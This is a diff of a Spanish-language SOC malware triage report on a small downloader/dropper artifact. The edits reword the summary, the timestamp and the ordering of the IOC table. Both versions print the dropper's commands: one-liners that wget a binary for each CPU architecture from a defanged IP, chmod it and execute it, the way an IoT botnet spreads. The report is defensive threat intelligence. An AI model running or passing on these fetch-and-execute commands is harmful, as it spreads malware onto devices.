@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se asociaron 5 comandos observados o extraídos.
+Artefacto identificado como ASCII text, with CRLF line terminators de 590 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `arm7` en `hxxp://31.56.209.XXX/arm7`. Se extrajeron 5 referencias URL únicas. Se observaron o extrajeron 5 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T21:01:51+00:00`
+- **Registrado:** `2026-08-09T21:01:51.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -46,8 +47,8 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 ## 🖥️ Comandos observados / extraídos
 
 ```text
-rm arm5; wget hxxp://31.56.209.XXX/arm5; chmod 777 arm5;./arm5 telnet;
 rm arm7; wget hxxp://31.56.209.XXX/arm7; chmod 777 arm7;./arm7 telnet;
+rm arm5; wget hxxp://31.56.209.XXX/arm5; chmod 777 arm5;./arm5 telnet;
 rm mips; wget hxxp://31.56.209.XXX/mips; chmod 777 mips;./mips telnet;
 rm mpsl; wget hxxp://31.56.209.XXX/mpsl; chmod 777 mpsl;./mpsl telnet;
 rm x86; wget hxxp://31.56.209.XXX/x86; chmod 777 x86;./x86 telnet;
@@ -57,18 +58,18 @@ rm x86; wget hxxp://31.56.209.XXX/x86; chmod 777 x86;./x86 telnet;
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 31.56.209.XXX | static_analysis |
-| url | hxxp://31.56.209.XXX/arm5; | strings |
 | url | hxxp://31.56.209.XXX/arm7; | strings |
-| url | hxxp://31.56.209.XXX/mips; | strings |
-| url | hxxp://31.56.209.XXX/mpsl; | strings |
 | url | hxxp://31.56.209.XXX/x86; | strings |
-| hash | 7efbd3c401363085d74e4a531988d7d3fd1ee1995ed6686cbc76d64e8d4f99a9 | static_analysis |
-| command | rm arm5; wget hxxp://31.56.209.XXX/arm5; chmod 777 arm5;./arm5 telnet; | strings |
+| url | hxxp://31.56.209.XXX/arm5; | strings |
+| url | hxxp://31.56.209.XXX/mpsl; | strings |
+| url | hxxp://31.56.209.XXX/mips; | strings |
+| ip | 31.56.209.XXX | static_analysis |
 | command | rm arm7; wget hxxp://31.56.209.XXX/arm7; chmod 777 arm7;./arm7 telnet; | strings |
+| command | rm arm5; wget hxxp://31.56.209.XXX/arm5; chmod 777 arm5;./arm5 telnet; | strings |
 | command | rm mips; wget hxxp://31.56.209.XXX/mips; chmod 777 mips;./mips telnet; | strings |
 | command | rm mpsl; wget hxxp://31.56.209.XXX/mpsl; chmod 777 mpsl;./mpsl telnet; | strings |
 | command | rm x86; wget hxxp://31.56.209.XXX/x86; chmod 777 x86;./x86 telnet; | strings |
+| hash | 7efbd3c401363085d74e4a531988d7d3fd1ee1995ed6686cbc76d64e8d4f99a9 | static_analysis |
 
 ## 🔎 Triage
 
